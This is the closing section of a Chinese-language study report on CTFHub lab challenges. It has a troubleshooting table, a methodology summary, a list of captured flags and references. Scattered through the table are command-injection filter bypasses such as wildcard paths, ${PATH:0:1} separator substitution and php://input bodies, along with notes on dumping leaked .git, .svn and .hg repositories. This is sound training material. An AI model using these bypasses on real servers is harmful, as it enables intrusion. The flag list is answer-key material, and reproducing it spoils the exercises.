|---|---|---|
| 1 | `python GitHack.py` 报 `can't open file` | Kali 上 `python` 就是 Python3，GitHack 要 `python2` |
| 2 | GitHack `ModuleNotFoundError: urlparse` | 它是 2017 年的 Py2 代码 |
| 3 | `fatal: not a git repository` | 在工具目录而非 `dist/<目标>/` |
| 4 | `cd dist/$T` 找不到 | 目录名是 netloc 的 `:` → `_`，且去掉 `http://` |
| 5 | `wget --cut-dirs=1` 削掉了 `.git` 层 | 产物目录本身就是 `.git`，要 `mv dumped repo/.git` |
| 6 | `--cc` 出不来内容 | **是我 grep 正则 `^[+-][^+-]` 排除了 `++` 前缀**，不是 git 的问题 |
| 7 | 凭"index 有 3 个条目"判成 Index 题 | **HEAD tree 也是 3 个，差集为空** —— 判据要算差集 |
| 8 | `curl .svn/wc.db` 报二进制警告 | **二进制文件必须 `-o`** |
| 9 | 只看 `NODES` 漏掉被删文件 | 要看 `PRISTINE` 的 `refcount = 0` |
| 10 | `.hg/store/data/flag_xxx.txt.i` → 404 | **`_` 要转义成 `__`** |
| 11 | revlog 解压报 `incomplete stream` | 首字节 `'u'` = 原文，不是 zlib |
| 12 | `rip-hg.pl` 报 `cannot find hg` | 要先 `apt install mercurial` |
| 13 | `ghproxy.net` 502 | 换 `gh-proxy.com` |
| 14 | **HackBar 里 body 被 URL 编码** | 看到 `%3C%3Fphp...` = 编码了；`php://input` 不解码 |
| 15 | **`-G` 把 body 变成 URL 参数** | `php://input` 就没 body 了 |
| 16 | **`eval` 里漏分号** → 空白 | PHP 语句要 `;`（除非后面跟 `?>`） |
| 17 | **`exec` 空白** = 输出走了 stderr | **加 `2>&1` 看错误** |
| 18 | `c?t` 命令不存在 | 通配符只在"所在目录"匹配，必须写 `/bin/c?t` |
| 19 | `cat flag_is_here/` 空白 | `cat` 的是目录 → `Is a directory` |
| 20 | **curl 吃掉 `${PATH:0:1}` 的花括号** | **URL globbing！加 `-g`** |
| 21 | `--data-urlencode` 把 `%0a` 再编码 | 用 `$'\n'` 发真换行 |
| 22 | 表单框里填 `%0a` 无效 | `<input>` 单行 + `%` 会被编码成 `%25` |
| 23 | 页面看不到 flag 但 Response 有 | **`<?php` 在 HTML 里是"伪注释"，会被吃** → 用 `base64` |

## 4.3 方法论

### 三层递进

```
① 看得见    →  探测：把"有没有"变成确定的事实
               （404 基线、状态码、title、固定路径表）
        ↓
② 拿得到    →  搬运：知道路径就能取（目录 403 但文件能读）
               （哈希路径 / 文件名编码）
        ↓
③ 读得懂    →  解码：zlib / base64 / revlog 标记 / 编码转换
```

### 两个通用套路

**套路 A：版本库泄露 = "探测 → 清单 → 取内容 → 解码"**

**套路 B：命令注入 = "找输入点 → 确认拼接 → 加分隔符 → 绕过滤"**

### 三个反直觉认知（本任务最大收获）

1. **`strpos` 返回 `0` 是 falsy** —— `if (!strpos(...))` 在"位置 0"时形同虚设
2. **`exec` 只收 stdout** —— 空白 ≠ 没执行，可能只是报错走了 stderr
3. **`<?php` 在 HTML 里是注释开头** —— 浏览器渲染会吞掉，Response 才是真相

### 一句话总结

> **信息泄露考的是"你知道该看哪里"，命令执行考的是"你知道能替换什么"。**
>
> **两者的答案都不在教程里，在你自己的环境里 —— 所以必须复现。**

---

## 附录 A：全部 flag 汇总（17 个）

### 信息泄露模块（9 + 5）

```
ctfhub{95c6f03d7cda19058d88ec1f}    网站源码
ctfhub{ff20cd30144373eedaa01abc}    bak 文件
ctfhub{1bbffdd2cca2f93ddc0ca8d8}    vim 缓存
ctfhub{2e801a81a591f99ffca80e07}    .DS_Store
ctfhub{dc8b0894d5a5689a22a35ffe}    Git Log
ctfhub{03f0f3f844084d7134cedad3}    Git Stash
ctfhub{b0571eeb61f6343ced553555}    Git 未删变体
ctfhub{6fd7676ba56da2a90a11af9a}    SVN
ctfhub{9260b70ead69a60fb2e0d968}    HG
ctfhub{1e5a12263055250cb6c8f170}    302 跳转
ctfhub{cf2690f992c9ebe484432aee}    Cookie 伪造
ctfhub{db7ba83bb0e787993a2fa43f}    基础认证 1
ctfhub{b227a7576366a4be3848faa5}    基础认证 2
ctfhub{d5b85603ca77329a3ae5a18}    Git 历史
```

### 命令执行模块（8）

```
ctfhub{64e8e0dae77db7d9c15ef8ab}    命令注入-无过滤
ctfhub{7234bb617c6421e4b8e40365}    eval 代码执行
ctfhub{5c3d2c0615beb813269640b6}    过滤 cat
ctfhub{7d4f698eda802c44829c9db7}    过滤空格
ctfhub{fba85d19b6751d803b3cee7c}    过滤目录分隔符
ctfhub{613d57ca6515a6b766b7caa0}    过滤运算符
ctfhub{7d928b22123076276bb32251}    综合练习
ctfhub{b4e8289cf23e6289829fb568}    文件包含
ctfhub{29c7fc65ea7034f067119535}    文件包含-php://input
ctfhub{95366c4682c791d1ff3f4272}    文件包含-filter
ctfhub{3e8215ea4ad95ff54cb15fe2}    文件包含-无 shell
```

### 独立复现

```
ctfhub{009ee4ed36138139d7349d59}    Git Log 复现
ctfhub{053da77b26b117ed9a380b03}    Git Stash 复现
ctfhub{52dd316df7c89131d95b8161}    HG 第二实例
```

## 附录 B：参考材料

| 文件 | 内容 |
|---|---|
| `notes/17-信息泄露漏洞.md` | 769 行，五类信息泄露 + 三库统一框架 |
| `notes/18-做题常见疑问.md` | 836 行，25 个实战问答 |
| `notes/20-信息泄露作业答案.md` | 403 行，五问完整答案 |
| `notes/21-PHP命令执行与绕过.md` | 546 行，8 函数实测 + 6 类绕过 |
| `writeups/靶场/CTFHub-GitStash.md` | 535 行，Stash 专题 WP |
| `writeups/靶场/CTFHub-基础认证.md` | 494 行，Basic Auth 专题 WP |
| `logs/2026-10-17.md` | 361 行，当日流水（含 12 条踩坑） |

---

**报告完成日期**：2026-10-21
**环境**：WSL2 + Kali Rolling / PHP 8.4.24（本地实测）/ PHP 5.6.40（靶场）
